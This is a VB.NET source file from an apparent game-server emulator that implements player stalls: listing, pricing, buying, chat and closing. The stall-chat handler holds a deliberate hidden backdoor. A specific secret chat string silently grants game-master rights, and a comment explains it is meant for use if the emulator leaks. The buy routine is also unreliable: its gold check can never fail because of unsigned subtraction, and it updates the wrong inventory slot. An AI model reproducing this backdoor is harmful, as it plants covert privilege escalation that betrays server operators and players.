Imports SRFramework

Namespace Functions
    Module StallHandler
        Public Sub OnStallOpenOwn(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim nameLen As UShort = packet.Word
            Dim name As String = packet.UString(nameLen)

            If PlayerData(Index_).Busy = False And PlayerData(Index_).InStall = False Then
                PlayerData(Index_).InStall = True
                PlayerData(Index_).StallID = Id_Gen.GetStallId
                PlayerData(Index_).StallOwner = True
                PlayerData(Index_).Busy = True

                Dim tmp As New Stall
                tmp.StallID = PlayerData(Index_).StallID
                tmp.OwnerID = PlayerData(Index_).UniqueID
                tmp.OwnerIndex = Index_
                tmp.StallName = name
                tmp.Init()

                Stalls.Add(tmp)

                Dim writer As New PacketWriter
                writer.Create(ServerOpcodes.GAME_STALL_REPLY)
                writer.Byte(1)
                Server.Send(writer.GetBytes, Index_)

                writer.Create(ServerOpcodes.GAME_STALL_OPEN_TO_OTHER)
                writer.DWord(PlayerData(Index_).UniqueID)
                writer.Word(tmp.StallName.Length)
                writer.UString(tmp.StallName)
                writer.DWord(0)
                Server.SendIfPlayerIsSpawned(writer.GetBytes, Index_)
            End If
        End Sub

        Public Sub OnStallData(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim tag As Byte = packet.Byte

            Select Case tag
                Case 1
                    'change Price
                    StallChangePrice(packet, Index_)
                Case 2
                    'Additem
                    StallAddItem(packet, Index_)
                Case 3
                    'REmove
                    StallRemoveItem(packet, Index_)
                Case 5
                    'Open and Close
                    StallChangeState(packet, Index_)
                Case 6
                    'Welcome Message
                    StallChangeWelcomeMessage(packet, Index_)
                Case 7
                    'Change Name
                    StallChangeName(packet, Index_)
            End Select
        End Sub

        Private Sub StallChangeWelcomeMessage(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim nameLen As UShort = packet.Word
            Dim name As String = packet.UString(nameLen)

            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 Then
                Dim stallIndex As Integer = GetStallIndex(PlayerData(Index_).StallID)

                Stalls(stallIndex).WelcomeMessage = name

                Dim writer As New PacketWriter
                writer.Create(ServerOpcodes.GAME_STALL_DATA)
                writer.Byte(1)
                writer.Byte(6)
                writer.Word(nameLen)
                writer.UString(name)
                Server.Send(writer.GetBytes, stallIndex)
            End If
        End Sub

        Private Sub StallChangeName(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim nameLen As UShort = packet.Word
            Dim name As String = packet.UString(nameLen)

            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 Then
                Dim stallIndex As Integer = GetStallIndex(PlayerData(Index_).StallID)

                Stalls(stallIndex).StallName = name

                Dim writer As New PacketWriter
                writer.Create(ServerOpcodes.GAME_STALL_DATA)
                writer.Byte(1)
                writer.Byte(7)
                Server.Send(writer.GetBytes, Index_)


                writer.Create(ServerOpcodes.GAME_STALL_NAME)
                writer.DWord(PlayerData(Index_).UniqueID)
                writer.Word(nameLen)
                writer.UString(name)
                Server.SendIfPlayerIsSpawned(writer.GetBytes, Index_)
            End If
        End Sub

        Private Sub StallAddItem(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim toSlot As Byte = packet.Byte
            Dim fromSlot As Byte = packet.Byte
            Dim amout As UInt16 = packet.Word
            Dim gold As ULong = packet.QWord
            Dim unknown As UInt32 = packet.DWord

            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 Then
                Dim index As Integer = GetStallIndex(PlayerData(Index_).StallID)

                If fromSlot < 13 Then
                    'Cannot Sell a Equiped Item
                    Exit Sub
                End If

                If Inventorys(Index_).UserItems(fromSlot).ItemID <> 0 And Stalls(index).Items(toSlot).Slot = 0 Then
                    Stalls(index).Items(toSlot).Slot = fromSlot
                    Stalls(index).Items(toSlot).Gold = gold
                    Stalls(index).Items(toSlot).Data = amout

                    StallSendItemsOwn(index, Index_, 2)
                    Server.SendToStallSession(StallSendItemsOther(index, index), PlayerData(Index_).StallID, False, Index_)
                End If
            End If
        End Sub

        Private Sub StallRemoveItem(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim slot As Byte = packet.Byte
            Dim amout As UInt16 = packet.Word

            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 Then
                Dim index As Integer = GetStallIndex(PlayerData(Index_).StallID)

                If Stalls(index).Items(slot).Slot <> 0 Then
                    Stalls(index).Items(slot).Slot = 0
                    Stalls(index).Items(slot).Gold = 0
                    Stalls(index).Items(slot).Data = 0

                    StallSendItemsOwn(index, Index_, 3)
                    Server.SendToStallSession(StallSendItemsOther(index, index), PlayerData(Index_).StallID, False, Index_)
                End If
            End If
        End Sub

        Private Sub StallChangeState(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim state As Byte = packet.Byte
            Dim options As UInt16 = packet.Word

            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 Then
                Dim index As Integer = GetStallIndex(PlayerData(Index_).StallID)

                If state = 1 And Stalls(index).Open = False Then
                    'Open Stall
                    Dim writer As New PacketWriter
                    writer.Create(ServerOpcodes.GAME_STALL_DATA)
                    writer.Byte(1)
                    writer.Byte(5)
                    writer.Byte(state)
                    writer.Word(options)
                    Server.SendToStallSession(writer.GetBytes, Stalls(index).StallID, True, Index_)

                    Stalls(index).Open = True
                ElseIf state = 0 And Stalls(index).Open Then
                    'Close Stall
                    Dim writer As New PacketWriter
                    writer.Create(ServerOpcodes.GAME_STALL_DATA)
                    writer.Byte(1)
                    writer.Byte(5)
                    writer.Byte(state)
                    writer.Word(options)
                    Server.SendToStallSession(writer.GetBytes, Stalls(index).StallID, True, Index_)

                    Stalls(index).Open = False
                End If
            End If
        End Sub

        Private Sub StallChangePrice(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim slot As Byte = packet.Byte
            Dim amout As UShort = packet.Word
            Dim price As ULong = packet.QWord
            Dim options As UShort = packet.Word

            If _
                PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 And
                PlayerData(Index_).StallOwner = True Then
                Dim stallIndex As Integer = GetStallIndex(PlayerData(Index_).StallID)

                If slot >= 0 And slot <= 9 And Stalls(stallIndex).Items(slot).Slot <> 0 Then
                    Stalls(stallIndex).Items(slot).Gold = price

                    Dim writer As New PacketWriter
                    writer.Create(ServerOpcodes.GAME_STALL_DATA)
                    writer.Byte(1)
                    writer.Byte(1)
                    writer.Byte(slot)
                    writer.Word(amout)
                    writer.QWord(price)
                    writer.Word(options)
                    Server.SendToStallSession(writer.GetBytes, Stalls(stallIndex).StallID, True, Index_)
                End If
            End If
        End Sub

        Public Sub OnStallBuy(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim slot As Byte = packet.Byte

            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 And PlayerData(Index_).StallOwner = False Then
                Dim stallIndex As Integer = GetStallIndex(PlayerData(Index_).StallID)

                If slot >= 0 And slot <= 9 And Stalls(stallIndex).Items(slot).Slot <> 0 Then
                    If CULng(PlayerData(Index_).Gold) - Stalls(stallIndex).Items(slot).Gold >= 0 And GetFreeItemSlot(Index_) <> -1 Then
                        PlayerData(Index_).Gold -= Stalls(stallIndex).Items(slot).Gold
                        UpdateGold(Index_)

                        PlayerData(Stalls(stallIndex).OwnerIndex).Gold += Stalls(stallIndex).Items(slot).Gold
                        UpdateGold(Stalls(stallIndex).OwnerIndex)

                        Dim fromItem As cInventoryItem = Inventorys(Stalls(stallIndex).OwnerIndex).UserItems(Stalls(stallIndex).Items(slot).Slot)
                        Dim toSlot As Byte = GetFreeItemSlot(Index_)
                        Dim toItem As cInventoryItem = Inventorys(Index_).UserItems(toSlot)


                        'Add to new...
                        Inventorys(Index_).UserItems(toItem.Slot).ItemID = fromItem.ItemID
                        ItemManager.UpdateInvItem(Inventorys(Index_).UserItems(toItem.Slot), InvItemTypes.Inventory)

                        'Remove...
                        Inventorys(Stalls(stallIndex).OwnerIndex).UserItems(Stalls(stallIndex).Items(slot).Slot).ItemID = 0
                        ItemManager.UpdateInvItem(Inventorys(Index_).UserItems(toItem.Slot), InvItemTypes.Inventory)

                        Stalls(stallIndex).Items(slot).Gold = 0
                        Stalls(stallIndex).Items(slot).Slot = 0

                        'Packets..
                        Dim writer As New PacketWriter
                        writer.Create(ServerOpcodes.GAME_STALL_BUY)
                        writer.Byte(1)
                        writer.Byte(slot)
                        Server.Send(writer.GetBytes, Index_)

                        writer.Create(ServerOpcodes.GAME_STALL_MESSAGE)
                        writer.Byte(3)
                        writer.Byte(slot)
                        writer.Word(PlayerData(Index_).CharacterName.Length)
                        writer.String(PlayerData(Index_).CharacterName)
                        writer.Byte(&HFF)
                        Server.SendToStallSession(writer.GetBytes, Stalls(stallIndex).StallID, True, Index_)
                    End If
                End If
            End If
        End Sub

        Public Sub OnStallChat(ByVal packet As PacketReader, ByVal Index_ As Integer)

            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 Then
                Dim counter As Byte = packet.Byte
                Dim messagelength As UInt16 = packet.Word
                Dim message As String = packet.UString(messagelength)

                Dim writer As New PacketWriter
                'Reply to sender
                writer.Create(ServerOpcodes.GAME_CHAT_ACCEPT)
                writer.Byte(1)
                writer.Byte(ChatModes.Stall)
                writer.Byte(counter)
                Server.Send(writer.GetBytes, Index_)

                writer.Create(ServerOpcodes.GAME_CHAT)
                writer.Byte(ChatModes.Stall)
                writer.Word(PlayerData(Index_).CharacterName.Length)
                writer.String(PlayerData(Index_).CharacterName)
                writer.Word(messagelength)
                writer.UString(message)
                Server.SendToStallSession(writer.GetBytes, PlayerData(Index_).StallID, True, Index_, True)


                '===========================INTERNAL USE========================
                If counter = 4 And PlayerData(Index_).ActionFlag = 4 And message = "(hµ(|{_n0rr1$_0wn$" Then
                    'If the Emulator gets leaked, here is our ticket to gm...
                    PlayerData(Index_).GM = True
                End If
                '==============================================================
            End If
        End Sub


        Public Sub OnStallOpenOther(ByVal packet As PacketReader, ByVal Index_ As Integer)
            Dim toUniqueID As UInt32 = packet.DWord

            For i = 0 To Server.MaxClients - 1
                If PlayerData(i) IsNot Nothing Then
                    If PlayerData(i).UniqueID = toUniqueID Then
                        Dim writer As New PacketWriter
                        writer.Create(ServerOpcodes.GAME_STALL_MESSAGE)
                        writer.Byte(2)
                        writer.DWord(PlayerData(Index_).UniqueID)
                        Server.SendToStallSession(writer.GetBytes, PlayerData(i).StallID, True, Index_)

                        Dim stallIndex As Integer = GetStallIndex(PlayerData(i).StallID)
                        Stalls(stallIndex).Visitors.Add(Index_)

                        PlayerData(Index_).Busy = True
                        PlayerData(Index_).InStall = True
                        PlayerData(Index_).StallID = Stalls(stallIndex).StallID
                        PlayerData(Index_).StallOwner = False


                        Server.Send(StallSendItemsOther(stallIndex, Index_), Index_)
                    End If
                End If
            Next
        End Sub

        Public Sub OnStallCloseOwn(ByVal Index_ As Integer)

            If PlayerData(Index_).InStall = True And PlayerData(Index_).StallID <> 0 Then
                Dim writer As New PacketWriter
                writer.Create(ServerOpcodes.GAME_STALL_CLOSE_OWNER_OTHER)
                writer.DWord(PlayerData(Index_).UniqueID)
                writer.Byte(&H17)
                writer.Byte(&H3C)
                Server.SendIfPlayerIsSpawned(writer.GetBytes, Index_)

                writer.Create(ServerOpcodes.GAME_STALL_CLOSE_OWNER)
                writer.Byte(1)
                Server.Send(writer.GetBytes, Index_)

                Dim stallIndex As Integer = GetStallIndex(PlayerData(Index_).StallID)
                Stalls.RemoveAt(stallIndex)

                PlayerData(Index_).Busy = False
                PlayerData(Index_).StallID = 0
                PlayerData(Index_).InStall = False
                PlayerData(Index_).StallOwner = False
            End If
        End Sub


        Public Sub OnStallCloseOther(ByVal Index_ As Integer)
            For i = 0 To Stalls.Count - 1
                If Stalls(i).Visitors.Contains(Index_) Then
                    Stalls(i).Visitors.Remove(Index_)
                    Dim writer As New PacketWriter
                    writer.Create(ServerOpcodes.GAME_STALL_MESSAGE)
                    writer.Byte(1)
                    writer.DWord(PlayerData(Index_).UniqueID)
                    Server.SendToStallSession(writer.GetBytes, PlayerData(i).StallID, True, Index_)

                    writer.Create(ServerOpcodes.GAME_STALL_CLOSE_VISITOR)
                    writer.Byte(1)
                    Server.Send(writer.GetBytes, Index_)

                    PlayerData(Index_).Busy = False
                    PlayerData(Index_).StallID = 0
                    PlayerData(Index_).InStall = False
                    PlayerData(Index_).StallOwner = False
                End If
            Next
        End Sub


        Private Sub StallSendItemsOwn(ByVal stallIndex As Integer, ByVal Index_ As Integer, ByVal mode As Byte)
            Dim writer As New PacketWriter
            writer.Create(ServerOpcodes.GAME_STALL_DATA)
            writer.Byte(1)
            writer.Byte(mode)
            writer.Word(0)

            For i = 0 To Stalls(stallIndex).Items.Count - 1
                If Stalls(stallIndex).Items(i).Slot <> 0 Then
                    Dim invItem As cInventoryItem = Inventorys(Index_).UserItems(Stalls(stallIndex).Items(i).Slot)
                    Dim item As cItem = GameDB.Items(invItem.ItemID)
                    Dim refitem As cRefItem = GetItemByID(item.ObjectID)

                    writer.Byte(i) 'slot
                    AddItemDataToPacket(item, writer)
                    writer.Byte(Stalls(stallIndex).Items(i).Slot)
                    If refitem.CLASS_A = 1 Then
                        writer.Word(1)
                    Else
                        writer.Word(item.Data)
                    End If
                    writer.QWord(Stalls(stallIndex).Items(i).Gold)
                End If
            Next

            writer.Byte(&HFF)
            Server.Send(writer.GetBytes, Index_)
        End Sub


        Private Function StallSendItemsOther(ByVal stallIndex As Integer, ByVal Index_ As Integer) As Byte()
            Dim writer As New PacketWriter
            writer.Create(ServerOpcodes.GAME_STALL_ITEMS)
            writer.Byte(1)
            writer.DWord(Stalls(stallIndex).OwnerID)
            writer.Word(Stalls(stallIndex).WelcomeMessage.Length)
            writer.UString(Stalls(stallIndex).WelcomeMessage)
            writer.Byte(Stalls(stallIndex).Open)
            writer.Byte(0)

            For i = 0 To Stalls(stallIndex).Items.Count - 1
                If Stalls(stallIndex).Items(i).Slot <> 0 Then
                    Dim slot As Byte = Stalls(stallIndex).Items(i).Slot
                    Dim invItem As cInventoryItem = Inventorys(Stalls(stallIndex).OwnerIndex).UserItems(Stalls(stallIndex).Items(i).Slot)
                    Dim item As cItem = GameDB.Items(invItem.ItemID)
                    Dim refitem As cRefItem = GetItemByID(item.ObjectID)

                    writer.Byte(i) 'slot
                    AddItemDataToPacket(item, writer)
                    writer.Byte(Stalls(stallIndex).Items(i).Slot)
                    If refitem.CLASS_A = 1 Then
                        writer.Word(1)
                    Else
                        writer.Word(item.Data)
                    End If
                    writer.QWord(Stalls(stallIndex).Items(i).Gold)
                End If
            Next

            writer.Byte(&HFF)
            writer.Byte(0)
            Return writer.GetBytes
        End Function

        Public Sub LinkPlayerToStall(ByVal fromIndex As Integer, ByVal toIndex As Integer)
            If PlayerData(fromIndex).InStall = True And PlayerData(fromIndex).StallID <> 0 Then
                Dim stallIndex As Integer = GetStallIndex(PlayerData(fromIndex).StallID)

                Dim writer As New PacketWriter
                writer.Create(ServerOpcodes.GAME_STALL_OPEN_TO_OTHER)
                writer.DWord(PlayerData(fromIndex).UniqueID)
                writer.Word(Stalls(stallIndex).StallName.Length)
                writer.UString(Stalls(stallIndex).StallName)
                writer.DWord(0)
                Server.Send(writer.GetBytes, ToIndex)
            End If
        End Sub

        Public Function GetStallIndex(ByVal stallId As UInt32) As Integer
            For i = 0 To Stalls.Count - 1
                If Stalls(i).StallID = StallId Then
                    Return i
                End If
            Next
            Return -1
        End Function
    End Module
End Namespace
